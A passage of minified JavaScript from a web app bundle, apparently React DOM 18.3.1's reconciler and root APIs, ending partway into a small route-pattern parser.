                    }
                    var w = dh(i);
                    if (w !== null) {
                        w.flags &= -257,
                        fh(w, i, a, s, t),
                        w.mode & 1 && ch(s, u, t),
                        t = w,
                        l = u;
                        var x = t.updateQueue;
                        if (x === null) {
                            var m = new Set;
                            m.add(l),
                            t.updateQueue = m
                        } else
                            x.add(l);
                        break e
                    } else {
                        if (!(t & 1)) {
                            ch(s, u, t),
                            kf();
                            break e
                        }
                        l = Error(M(426))
                    }
                } else if (Ae && a.mode & 1) {
                    var S = dh(i);
                    if (S !== null) {
                        !(S.flags & 65536) && (S.flags |= 256),
                        fh(S, i, a, s, t),
                        sf(ds(l, a));
                        break e
                    }
                }
                s = l = ds(l, a),
                qe !== 4 && (qe = 2),
                ni === null ? ni = [s] : ni.push(s),
                s = i;
                do {
                    switch (s.tag) {
                    case 3:
                        s.flags |= 65536,
                        t &= -t,
                        s.lanes |= t;
                        var v = Cg(s, l, t);
                        oh(s, v);
                        break e;
                    case 1:
                        a = l;
                        var f = s.type
                          , y = s.stateNode;
                        if (!(s.flags & 128) && (typeof f.getDerivedStateFromError == "function" || y !== null && typeof y.componentDidCatch == "function" && (_r === null || !_r.has(y)))) {
                            s.flags |= 65536,
                            t &= -t,
                            s.lanes |= t;
                            var _ = kg(s, a, t);
                            oh(s, _);
                            break e
                        }
                    }
                    s = s.return
                } while (s !== null)
            }
            Wg(n)
        } catch (b) {
            t = b,
            He === n && n !== null && (He = n = n.return);
            continue
        }
        break
    } while (!0)
}
function Bg() {
    var e = yl.current;
    return yl.current = gl,
    e === null ? gl : e
}
function kf() {
    (qe === 0 || qe === 3 || qe === 2) && (qe = 4),
    Je === null || !(so & 268435455) && !(eu & 268435455) || ar(Je, rt)
}
function Sl(e, t) {
    var n = he;
    he |= 2;
    var r = Bg();
    (Je !== e || rt !== t) && (Fn = null,
    Xr(e, t));
    do
        try {
            s_();
            break
        } catch (o) {
            Ug(e, o)
        }
    while (!0);
    if (lf(),
    he = n,
    yl.current = r,
    He !== null)
        throw Error(M(261));
    return Je = null,
    rt = 0,
    qe
}
function s_() {
    for (; He !== null; )
        Hg(He)
}
function i_() {
    for (; He !== null && !A1(); )
        Hg(He)
}
function Hg(e) {
    var t = Kg(e.alternate, e, At);
    e.memoizedProps = e.pendingProps,
    t === null ? Wg(e) : He = t,
    Sf.current = null
}
function Wg(e) {
    var t = e;
    do {
        var n = t.alternate;
        if (e = t.return,
        t.flags & 32768) {
            if (n = JS(n, t),
            n !== null) {
                n.flags &= 32767,
                He = n;
                return
            }
            if (e !== null)
                e.flags |= 32768,
                e.subtreeFlags = 0,
                e.deletions = null;
            else {
                qe = 6,
                He = null;
                return
            }
        } else if (n = XS(n, t, At),
        n !== null) {
            He = n;
            return
        }
        if (t = t.sibling,
        t !== null) {
            He = t;
            return
        }
        He = t = e
    } while (t !== null);
    qe === 0 && (qe = 5)
}
function Ur(e, t, n) {
    var r = Ee
      , o = Qt.transition;
    try {
        Qt.transition = null,
        Ee = 1,
        a_(e, t, n, r)
    } finally {
        Qt.transition = o,
        Ee = r
    }
    return null
}
function a_(e, t, n, r) {
    do
        Ho();
    while (vr !== null);
    if (he & 6)
        throw Error(M(327));
    n = e.finishedWork;
    var o = e.finishedLanes;
    if (n === null)
        return null;
    if (e.finishedWork = null,
    e.finishedLanes = 0,
    n === e.current)
        throw Error(M(177));
    e.callbackNode = null,
    e.callbackPriority = 0;
    var s = n.lanes | n.childLanes;
    if ($1(e, s),
    e === Je && (He = Je = null,
    rt = 0),
    !(n.subtreeFlags & 2064) && !(n.flags & 2064) || ba || (ba = !0,
    Qg(nl, function() {
        return Ho(),
        null
    })),
    s = (n.flags & 15990) !== 0,
    n.subtreeFlags & 15990 || s) {
        s = Qt.transition,
        Qt.transition = null;
        var i = Ee;
        Ee = 1;
        var a = he;
        he |= 4,
        Sf.current = null,
        t_(e, n),
        Vg(n, e),
        TS(Uc),
        ol = !!$c,
        Uc = $c = null,
        e.current = n,
        n_(n),
        O1(),
        he = a,
        Ee = i,
        Qt.transition = s
    } else
        e.current = n;
    if (ba && (ba = !1,
    vr = e,
    xl = o),
    s = e.pendingLanes,
    s === 0 && (_r = null),
    I1(n.stateNode),
    Nt(e, $e()),
    t !== null)
        for (r = e.onRecoverableError,
        n = 0; n < t.length; n++)
            o = t[n],
            r(o.value, {
                componentStack: o.stack,
                digest: o.digest
            });
    if (wl)
        throw wl = !1,
        e = ld,
        ld = null,
        e;
    return xl & 1 && e.tag !== 0 && Ho(),
    s = e.pendingLanes,
    s & 1 ? e === ud ? ri++ : (ri = 0,
    ud = e) : ri = 0,
    Dr(),
    null
}
function Ho() {
    if (vr !== null) {
        var e = Cv(xl)
          , t = Qt.transition
          , n = Ee;
        try {
            if (Qt.transition = null,
            Ee = 16 > e ? 16 : e,
            vr === null)
                var r = !1;
            else {
                if (e = vr,
                vr = null,
                xl = 0,
                he & 6)
                    throw Error(M(331));
                var o = he;
                for (he |= 4,
                Z = e.current; Z !== null; ) {
                    var s = Z
                      , i = s.child;
                    if (Z.flags & 16) {
                        var a = s.deletions;
                        if (a !== null) {
                            for (var l = 0; l < a.length; l++) {
                                var u = a[l];
                                for (Z = u; Z !== null; ) {
                                    var c = Z;
                                    switch (c.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        ti(8, c, s)
                                    }
                                    var d = c.child;
                                    if (d !== null)
                                        d.return = c,
                                        Z = d;
                                    else
                                        for (; Z !== null; ) {
                                            c = Z;
                                            var p = c.sibling
                                              , w = c.return;
                                            if (Lg(c),
                                            c === u) {
                                                Z = null;
                                                break
                                            }
                                            if (p !== null) {
                                                p.return = w,
                                                Z = p;
                                                break
                                            }
                                            Z = w
                                        }
                                }
                            }
                            var x = s.alternate;
                            if (x !== null) {
                                var m = x.child;
                                if (m !== null) {
                                    x.child = null;
                                    do {
                                        var S = m.sibling;
                                        m.sibling = null,
                                        m = S
                                    } while (m !== null)
                                }
                            }
                            Z = s
                        }
                    }
                    if (s.subtreeFlags & 2064 && i !== null)
                        i.return = s,
                        Z = i;
                    else
                        e: for (; Z !== null; ) {
                            if (s = Z,
                            s.flags & 2048)
                                switch (s.tag) {
                                case 0:
                                case 11:
                                case 15:
                                    ti(9, s, s.return)
                                }
                            var v = s.sibling;
                            if (v !== null) {
                                v.return = s.return,
                                Z = v;
                                break e
                            }
                            Z = s.return
                        }
                }
                var f = e.current;
                for (Z = f; Z !== null; ) {
                    i = Z;
                    var y = i.child;
                    if (i.subtreeFlags & 2064 && y !== null)
                        y.return = i,
                        Z = y;
                    else
                        e: for (i = f; Z !== null; ) {
                            if (a = Z,
                            a.flags & 2048)
                                try {
                                    switch (a.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        Jl(9, a)
                                    }
                                } catch (b) {
                                    Ve(a, a.return, b)
                                }
                            if (a === i) {
                                Z = null;
                                break e
                            }
                            var _ = a.sibling;
                            if (_ !== null) {
                                _.return = a.return,
                                Z = _;
                                break e
                            }
                            Z = a.return
                        }
                }
                if (he = o,
                Dr(),
                Cn && typeof Cn.onPostCommitFiberRoot == "function")
                    try {
                        Cn.onPostCommitFiberRoot(Wl, e)
                    } catch {}
                r = !0
            }
            return r
        } finally {
            Ee = n,
            Qt.transition = t
        }
    }
    return !1
}
function Ch(e, t, n) {
    t = ds(n, t),
    t = Cg(e, t, 1),
    e = Sr(e, t, 1),
    t = yt(),
    e !== null && (Yi(e, 1, t),
    Nt(e, t))
}
function Ve(e, t, n) {
    if (e.tag === 3)
        Ch(e, e, n);
    else
        for (; t !== null; ) {
            if (t.tag === 3) {
                Ch(t, e, n);
                break
            } else if (t.tag === 1) {
                var r = t.stateNode;
                if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (_r === null || !_r.has(r))) {
                    e = ds(n, e),
                    e = kg(t, e, 1),
                    t = Sr(t, e, 1),
                    e = yt(),
                    t !== null && (Yi(t, 1, e),
                    Nt(t, e));
                    break
                }
            }
            t = t.return
        }
}
function l_(e, t, n) {
    var r = e.pingCache;
    r !== null && r.delete(t),
    t = yt(),
    e.pingedLanes |= e.suspendedLanes & n,
    Je === e && (rt & n) === n && (qe === 4 || qe === 3 && (rt & 130023424) === rt && 500 > $e() - Ef ? Xr(e, 0) : _f |= n),
    Nt(e, t)
}
function Zg(e, t) {
    t === 0 && (e.mode & 1 ? (t = ha,
    ha <<= 1,
    !(ha & 130023424) && (ha = 4194304)) : t = 1);
    var n = yt();
    e = Kn(e, t),
    e !== null && (Yi(e, t, n),
    Nt(e, n))
}
function u_(e) {
    var t = e.memoizedState
      , n = 0;
    t !== null && (n = t.retryLane),
    Zg(e, n)
}
function c_(e, t) {
    var n = 0;
    switch (e.tag) {
    case 13:
        var r = e.stateNode
          , o = e.memoizedState;
        o !== null && (n = o.retryLane);
        break;
    case 19:
        r = e.stateNode;
        break;
    default:
        throw Error(M(314))
    }
    r !== null && r.delete(t),
    Zg(e, n)
}
var Kg;
Kg = function(e, t, n) {
    if (e !== null)
        if (e.memoizedProps !== t.pendingProps || Tt.current)
            kt = !0;
        else {
            if (!(e.lanes & n) && !(t.flags & 128))
                return kt = !1,
                YS(e, t, n);
            kt = !!(e.flags & 131072)
        }
    else
        kt = !1,
        Ae && t.flags & 1048576 && Yv(t, dl, t.index);
    switch (t.lanes = 0,
    t.tag) {
    case 2:
        var r = t.type;
        Ua(e, t),
        e = t.pendingProps;
        var o = as(t, dt.current);
        Bo(t, n),
        o = vf(null, t, r, e, o, n);
        var s = gf();
        return t.flags |= 1,
        typeof o == "object" && o !== null && typeof o.render == "function" && o.$$typeof === void 0 ? (t.tag = 1,
        t.memoizedState = null,
        t.updateQueue = null,
        Pt(r) ? (s = !0,
        ul(t)) : s = !1,
        t.memoizedState = o.state !== null && o.state !== void 0 ? o.state : null,
        df(t),
        o.updater = Xl,
        t.stateNode = o,
        o._reactInternals = t,
        Yc(t, r, e, n),
        t = ed(null, t, r, !0, s, n)) : (t.tag = 0,
        Ae && s && rf(t),
        mt(null, t, o, n),
        t = t.child),
        t;
    case 16:
        r = t.elementType;
        e: {
            switch (Ua(e, t),
            e = t.pendingProps,
            o = r._init,
            r = o(r._payload),
            t.type = r,
            o = t.tag = f_(r),
            e = Jt(r, e),
            o) {
            case 0:
                t = Jc(null, t, r, e, n);
                break e;
            case 1:
                t = mh(null, t, r, e, n);
                break e;
            case 11:
                t = ph(null, t, r, e, n);
                break e;
            case 14:
                t = hh(null, t, r, Jt(r.type, e), n);
                break e
            }
            throw Error(M(306, r, ""))
        }
        return t;
    case 0:
        return r = t.type,
        o = t.pendingProps,
        o = t.elementType === r ? o : Jt(r, o),
        Jc(e, t, r, o, n);
    case 1:
        return r = t.type,
        o = t.pendingProps,
        o = t.elementType === r ? o : Jt(r, o),
        mh(e, t, r, o, n);
    case 3:
        e: {
            if (Rg(t),
            e === null)
                throw Error(M(387));
            r = t.pendingProps,
            s = t.memoizedState,
            o = s.element,
            rg(e, t),
            hl(t, r, null, n);
            var i = t.memoizedState;
            if (r = i.element,
            s.isDehydrated)
                if (s = {
                    element: r,
                    isDehydrated: !1,
                    cache: i.cache,
                    pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                    transitions: i.transitions
                },
                t.updateQueue.baseState = s,
                t.memoizedState = s,
                t.flags & 256) {
                    o = ds(Error(M(423)), t),
                    t = vh(e, t, r, n, o);
                    break e
                } else if (r !== o) {
                    o = ds(Error(M(424)), t),
                    t = vh(e, t, r, n, o);
                    break e
                } else
                    for (jt = xr(t.stateNode.containerInfo.firstChild),
                    Mt = t,
                    Ae = !0,
                    on = null,
                    n = tg(t, null, r, n),
                    t.child = n; n; )
                        n.flags = n.flags & -3 | 4096,
                        n = n.sibling;
            else {
                if (ls(),
                r === o) {
                    t = Qn(e, t, n);
                    break e
                }
                mt(e, t, r, n)
            }
            t = t.child
        }
        return t;
    case 5:
        return og(t),
        e === null && Qc(t),
        r = t.type,
        o = t.pendingProps,
        s = e !== null ? e.memoizedProps : null,
        i = o.children,
        Bc(r, o) ? i = null : s !== null && Bc(r, s) && (t.flags |= 32),
        Ng(e, t),
        mt(e, t, i, n),
        t.child;
    case 6:
        return e === null && Qc(t),
        null;
    case 13:
        return Ag(e, t, n);
    case 4:
        return ff(t, t.stateNode.containerInfo),
        r = t.pendingProps,
        e === null ? t.child = us(t, null, r, n) : mt(e, t, r, n),
        t.child;
    case 11:
        return r = t.type,
        o = t.pendingProps,
        o = t.elementType === r ? o : Jt(r, o),
        ph(e, t, r, o, n);
    case 7:
        return mt(e, t, t.pendingProps, n),
        t.child;
    case 8:
        return mt(e, t, t.pendingProps.children, n),
        t.child;
    case 12:
        return mt(e, t, t.pendingProps.children, n),
        t.child;
    case 10:
        e: {
            if (r = t.type._context,
            o = t.pendingProps,
            s = t.memoizedProps,
            i = o.value,
            Ce(fl, r._currentValue),
            r._currentValue = i,
            s !== null)
                if (fn(s.value, i)) {
                    if (s.children === o.children && !Tt.current) {
                        t = Qn(e, t, n);
                        break e
                    }
                } else
                    for (s = t.child,
                    s !== null && (s.return = t); s !== null; ) {
                        var a = s.dependencies;
                        if (a !== null) {
                            i = s.child;
                            for (var l = a.firstContext; l !== null; ) {
                                if (l.context === r) {
                                    if (s.tag === 1) {
                                        l = Hn(-1, n & -n),
                                        l.tag = 2;
                                        var u = s.updateQueue;
                                        if (u !== null) {
                                            u = u.shared;
                                            var c = u.pending;
                                            c === null ? l.next = l : (l.next = c.next,
                                            c.next = l),
                                            u.pending = l
                                        }
                                    }
                                    s.lanes |= n,
                                    l = s.alternate,
                                    l !== null && (l.lanes |= n),
                                    qc(s.return, n, t),
                                    a.lanes |= n;
                                    break
                                }
                                l = l.next
                            }
                        } else if (s.tag === 10)
                            i = s.type === t.type ? null : s.child;
                        else if (s.tag === 18) {
                            if (i = s.return,
                            i === null)
                                throw Error(M(341));
                            i.lanes |= n,
                            a = i.alternate,
                            a !== null && (a.lanes |= n),
                            qc(i, n, t),
                            i = s.sibling
                        } else
                            i = s.child;
                        if (i !== null)
                            i.return = s;
                        else
                            for (i = s; i !== null; ) {
                                if (i === t) {
                                    i = null;
                                    break
                                }
                                if (s = i.sibling,
                                s !== null) {
                                    s.return = i.return,
                                    i = s;
                                    break
                                }
                                i = i.return
                            }
                        s = i
                    }
            mt(e, t, o.children, n),
            t = t.child
        }
        return t;
    case 9:
        return o = t.type,
        r = t.pendingProps.children,
        Bo(t, n),
        o = qt(o),
        r = r(o),
        t.flags |= 1,
        mt(e, t, r, n),
        t.child;
    case 14:
        return r = t.type,
        o = Jt(r, t.pendingProps),
        o = Jt(r.type, o),
        hh(e, t, r, o, n);
    case 15:
        return Tg(e, t, t.type, t.pendingProps, n);
    case 17:
        return r = t.type,
        o = t.pendingProps,
        o = t.elementType === r ? o : Jt(r, o),
        Ua(e, t),
        t.tag = 1,
        Pt(r) ? (e = !0,
        ul(t)) : e = !1,
        Bo(t, n),
        bg(t, r, o),
        Yc(t, r, o, n),
        ed(null, t, r, !0, e, n);
    case 19:
        return Og(e, t, n);
    case 22:
        return Pg(e, t, n)
    }
    throw Error(M(156, t.tag))
}
;
function Qg(e, t) {
    return Sv(e, t)
}
function d_(e, t, n, r) {
    this.tag = e,
    this.key = n,
    this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
    this.index = 0,
    this.ref = null,
    this.pendingProps = t,
    this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
    this.mode = r,
    this.subtreeFlags = this.flags = 0,
    this.deletions = null,
    this.childLanes = this.lanes = 0,
    this.alternate = null
}
function Kt(e, t, n, r) {
    return new d_(e,t,n,r)
}
function Tf(e) {
    return e = e.prototype,
    !(!e || !e.isReactComponent)
}
function f_(e) {
    if (typeof e == "function")
        return Tf(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof,
        e === Wd)
            return 11;
        if (e === Zd)
            return 14
    }
    return 2
}
function br(e, t) {
    var n = e.alternate;
    return n === null ? (n = Kt(e.tag, t, e.key, e.mode),
    n.elementType = e.elementType,
    n.type = e.type,
    n.stateNode = e.stateNode,
    n.alternate = e,
    e.alternate = n) : (n.pendingProps = t,
    n.type = e.type,
    n.flags = 0,
    n.subtreeFlags = 0,
    n.deletions = null),
    n.flags = e.flags & 14680064,
    n.childLanes = e.childLanes,
    n.lanes = e.lanes,
    n.child = e.child,
    n.memoizedProps = e.memoizedProps,
    n.memoizedState = e.memoizedState,
    n.updateQueue = e.updateQueue,
    t = e.dependencies,
    n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    },
    n.sibling = e.sibling,
    n.index = e.index,
    n.ref = e.ref,
    n
}
function Wa(e, t, n, r, o, s) {
    var i = 2;
    if (r = e,
    typeof e == "function")
        Tf(e) && (i = 1);
    else if (typeof e == "string")
        i = 5;
    else
        e: switch (e) {
        case To:
            return Jr(n.children, o, s, t);
        case Hd:
            i = 8,
            o |= 8;
            break;
        case Sc:
            return e = Kt(12, n, t, o | 2),
            e.elementType = Sc,
            e.lanes = s,
            e;
        case _c:
            return e = Kt(13, n, t, o),
            e.elementType = _c,
            e.lanes = s,
            e;
        case Ec:
            return e = Kt(19, n, t, o),
            e.elementType = Ec,
            e.lanes = s,
            e;
        case ov:
            return tu(n, o, s, t);
        default:
            if (typeof e == "object" && e !== null)
                switch (e.$$typeof) {
                case nv:
                    i = 10;
                    break e;
                case rv:
                    i = 9;
                    break e;
                case Wd:
                    i = 11;
                    break e;
                case Zd:
                    i = 14;
                    break e;
                case or:
                    i = 16,
                    r = null;
                    break e
                }
            throw Error(M(130, e == null ? e : typeof e, ""))
        }
    return t = Kt(i, n, t, o),
    t.elementType = e,
    t.type = r,
    t.lanes = s,
    t
}
function Jr(e, t, n, r) {
    return e = Kt(7, e, r, t),
    e.lanes = n,
    e
}
function tu(e, t, n, r) {
    return e = Kt(22, e, r, t),
    e.elementType = ov,
    e.lanes = n,
    e.stateNode = {
        isHidden: !1
    },
    e
}
function Xu(e, t, n) {
    return e = Kt(6, e, null, t),
    e.lanes = n,
    e
}
function Ju(e, t, n) {
    return t = Kt(4, e.children !== null ? e.children : [], e.key, t),
    t.lanes = n,
    t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    },
    t
}
function p_(e, t, n, r, o) {
    this.tag = t,
    this.containerInfo = e,
    this.finishedWork = this.pingCache = this.current = this.pendingChildren = null,
    this.timeoutHandle = -1,
    this.callbackNode = this.pendingContext = this.context = null,
    this.callbackPriority = 0,
    this.eventTimes = ju(0),
    this.expirationTimes = ju(-1),
    this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
    this.entanglements = ju(0),
    this.identifierPrefix = r,
    this.onRecoverableError = o,
    this.mutableSourceEagerHydrationData = null
}
function Pf(e, t, n, r, o, s, i, a, l) {
    return e = new p_(e,t,n,a,l),
    t === 1 ? (t = 1,
    s === !0 && (t |= 8)) : t = 0,
    s = Kt(3, null, null, t),
    e.current = s,
    s.stateNode = e,
    s.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    },
    df(s),
    e
}
function h_(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: ko,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}
function qg(e) {
    if (!e)
        return kr;
    e = e._reactInternals;
    e: {
        if (ho(e) !== e || e.tag !== 1)
            throw Error(M(170));
        var t = e;
        do {
            switch (t.tag) {
            case 3:
                t = t.stateNode.context;
                break e;
            case 1:
                if (Pt(t.type)) {
                    t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                    break e
                }
            }
            t = t.return
        } while (t !== null);
        throw Error(M(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (Pt(n))
            return qv(e, n, t)
    }
    return t
}
function Gg(e, t, n, r, o, s, i, a, l) {
    return e = Pf(n, r, !0, e, o, s, i, a, l),
    e.context = qg(null),
    n = e.current,
    r = yt(),
    o = Er(n),
    s = Hn(r, o),
    s.callback = t ?? null,
    Sr(n, s, o),
    e.current.lanes = o,
    Yi(e, o, r),
    Nt(e, r),
    e
}
function nu(e, t, n, r) {
    var o = t.current
      , s = yt()
      , i = Er(o);
    return n = qg(n),
    t.context === null ? t.context = n : t.pendingContext = n,
    t = Hn(s, i),
    t.payload = {
        element: e
    },
    r = r === void 0 ? null : r,
    r !== null && (t.callback = r),
    e = Sr(o, t, i),
    e !== null && (cn(e, o, i, s),
    Va(e, o, i)),
    i
}
function _l(e) {
    if (e = e.current,
    !e.child)
        return null;
    switch (e.child.tag) {
    case 5:
        return e.child.stateNode;
    default:
        return e.child.stateNode
    }
}
function kh(e, t) {
    if (e = e.memoizedState,
    e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}
function Nf(e, t) {
    kh(e, t),
    (e = e.alternate) && kh(e, t)
}
function m_() {
    return null
}
var Yg = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
}
;
function Rf(e) {
    this._internalRoot = e
}
ru.prototype.render = Rf.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null)
        throw Error(M(409));
    nu(e, t, null, null)
}
;
ru.prototype.unmount = Rf.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        io(function() {
            nu(null, e, null, null)
        }),
        t[Zn] = null
    }
}
;
function ru(e) {
    this._internalRoot = e
}
ru.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = Pv();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < ir.length && t !== 0 && t < ir[n].priority; n++)
            ;
        ir.splice(n, 0, e),
        n === 0 && Rv(e)
    }
}
;
function Af(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}
function ou(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}
function Th() {}
function v_(e, t, n, r, o) {
    if (o) {
        if (typeof r == "function") {
            var s = r;
            r = function() {
                var u = _l(i);
                s.call(u)
            }
        }
        var i = Gg(t, r, e, 0, null, !1, !1, "", Th);
        return e._reactRootContainer = i,
        e[Zn] = i.current,
        mi(e.nodeType === 8 ? e.parentNode : e),
        io(),
        i
    }
    for (; o = e.lastChild; )
        e.removeChild(o);
    if (typeof r == "function") {
        var a = r;
        r = function() {
            var u = _l(l);
            a.call(u)
        }
    }
    var l = Pf(e, 0, !1, null, null, !1, !1, "", Th);
    return e._reactRootContainer = l,
    e[Zn] = l.current,
    mi(e.nodeType === 8 ? e.parentNode : e),
    io(function() {
        nu(t, l, n, r)
    }),
    l
}
function su(e, t, n, r, o) {
    var s = n._reactRootContainer;
    if (s) {
        var i = s;
        if (typeof o == "function") {
            var a = o;
            o = function() {
                var l = _l(i);
                a.call(l)
            }
        }
        nu(t, i, e, o)
    } else
        i = v_(n, t, e, o, r);
    return _l(i)
}
kv = function(e) {
    switch (e.tag) {
    case 3:
        var t = e.stateNode;
        if (t.current.memoizedState.isDehydrated) {
            var n = Hs(t.pendingLanes);
            n !== 0 && (qd(t, n | 1),
            Nt(t, $e()),
            !(he & 6) && (fs = $e() + 500,
            Dr()))
        }
        break;
    case 13:
        io(function() {
            var r = Kn(e, 1);
            if (r !== null) {
                var o = yt();
                cn(r, e, 1, o)
            }
        }),
        Nf(e, 1)
    }
}
;
Gd = function(e) {
    if (e.tag === 13) {
        var t = Kn(e, 134217728);
        if (t !== null) {
            var n = yt();
            cn(t, e, 134217728, n)
        }
        Nf(e, 134217728)
    }
}
;
Tv = function(e) {
    if (e.tag === 13) {
        var t = Er(e)
          , n = Kn(e, t);
        if (n !== null) {
            var r = yt();
            cn(n, e, t, r)
        }
        Nf(e, t)
    }
}
;
Pv = function() {
    return Ee
}
;
Nv = function(e, t) {
    var n = Ee;
    try {
        return Ee = e,
        t()
    } finally {
        Ee = n
    }
}
;
jc = function(e, t, n) {
    switch (t) {
    case "input":
        if (kc(e, n),
        t = n.name,
        n.type === "radio" && t != null) {
            for (n = e; n.parentNode; )
                n = n.parentNode;
            for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'),
            t = 0; t < n.length; t++) {
                var r = n[t];
                if (r !== e && r.form === e.form) {
                    var o = ql(r);
                    if (!o)
                        throw Error(M(90));
                    iv(r),
                    kc(r, o)
                }
            }
        }
        break;
    case "textarea":
        lv(e, n);
        break;
    case "select":
        t = n.value,
        t != null && Vo(e, !!n.multiple, t, !1)
    }
}
;
mv = bf;
vv = io;
var g_ = {
    usingClientEntryPoint: !1,
    Events: [Ji, Ao, ql, pv, hv, bf]
}
  , Ms = {
    findFiberByHostInstance: Br,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom"
}
  , y_ = {
    bundleType: Ms.bundleType,
    version: Ms.version,
    rendererPackageName: Ms.rendererPackageName,
    rendererConfig: Ms.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: Xn.ReactCurrentDispatcher,
    findHostInstanceByFiber: function(e) {
        return e = wv(e),
        e === null ? null : e.stateNode
    },
    findFiberByHostInstance: Ms.findFiberByHostInstance || m_,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
};
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var Ca = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!Ca.isDisabled && Ca.supportsFiber)
        try {
            Wl = Ca.inject(y_),
            Cn = Ca
        } catch {}
}
Vt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = g_;
Vt.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!Af(t))
        throw Error(M(200));
    return h_(e, t, null, n)
}
;
Vt.createRoot = function(e, t) {
    if (!Af(e))
        throw Error(M(299));
    var n = !1
      , r = ""
      , o = Yg;
    return t != null && (t.unstable_strictMode === !0 && (n = !0),
    t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
    t.onRecoverableError !== void 0 && (o = t.onRecoverableError)),
    t = Pf(e, 1, !1, null, null, n, !1, r, o),
    e[Zn] = t.current,
    mi(e.nodeType === 8 ? e.parentNode : e),
    new Rf(t)
}
;
Vt.findDOMNode = function(e) {
    if (e == null)
        return null;
    if (e.nodeType === 1)
        return e;
    var t = e._reactInternals;
    if (t === void 0)
        throw typeof e.render == "function" ? Error(M(188)) : (e = Object.keys(e).join(","),
        Error(M(268, e)));
    return e = wv(t),
    e = e === null ? null : e.stateNode,
    e
}
;
Vt.flushSync = function(e) {
    return io(e)
}
;
Vt.hydrate = function(e, t, n) {
    if (!ou(t))
        throw Error(M(200));
    return su(null, e, t, !0, n)
}
;
Vt.hydrateRoot = function(e, t, n) {
    if (!Af(e))
        throw Error(M(405));
    var r = n != null && n.hydratedSources || null
      , o = !1
      , s = ""
      , i = Yg;
    if (n != null && (n.unstable_strictMode === !0 && (o = !0),
    n.identifierPrefix !== void 0 && (s = n.identifierPrefix),
    n.onRecoverableError !== void 0 && (i = n.onRecoverableError)),
    t = Gg(t, null, e, 1, n ?? null, o, !1, s, i),
    e[Zn] = t.current,
    mi(e),
    r)
        for (e = 0; e < r.length; e++)
            n = r[e],
            o = n._getVersion,
            o = o(n._source),
            t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, o] : t.mutableSourceEagerHydrationData.push(n, o);
    return new ru(t)
}
;
Vt.render = function(e, t, n) {
    if (!ou(t))
        throw Error(M(200));
    return su(null, e, t, !1, n)
}
;
Vt.unmountComponentAtNode = function(e) {
    if (!ou(e))
        throw Error(M(40));
    return e._reactRootContainer ? (io(function() {
        su(null, null, e, !1, function() {
            e._reactRootContainer = null,
            e[Zn] = null
        })
    }),
    !0) : !1
}
;
Vt.unstable_batchedUpdates = bf;
Vt.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!ou(n))
        throw Error(M(200));
    if (e == null || e._reactInternals === void 0)
        throw Error(M(38));
    return su(e, t, n, !1, r)
}
;
Vt.version = "18.3.1-next-f1338f8080-20240426";
function Xg() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
        try {
            __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Xg)
        } catch (e) {
            console.error(e)
        }
}
Xg(),
Xm.exports = Vt;
var mo = Xm.exports;
const w_ = ys(mo);
var Jg, Ph = mo;
Jg = Ph.createRoot,
Ph.hydrateRoot;
function x_(e, t) {
    if (e instanceof RegExp)
        return {
            keys: !1,
            pattern: e
        };
    var n, r, o, s, i = [], a = "", l = e.split("/");
    for (l[0] || l.shift(); o = l.shift(); )
        n = o[0],
        n === "*" ? (i.push(n),
        a += o[1] === "?" ? "(?:/(.*))?" : "/(.*)") : n === ":" ? (r = o.indexOf("?", 1),
        s = o.indexOf(".", 1),
        i.push(o.substring(1, ~r ? r : ~s ? s : o.length)),
